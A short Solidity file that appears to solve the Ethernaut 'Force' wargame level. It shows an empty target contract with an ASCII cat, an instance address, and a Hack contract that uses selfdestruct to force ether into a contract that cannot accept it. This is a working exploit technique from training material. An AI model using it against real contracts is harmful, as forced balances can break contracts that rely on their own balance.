// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// 0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea

contract Hack{
    function sendFunds(address payable Addr) public payable{
        selfdestruct(Addr);
    }

}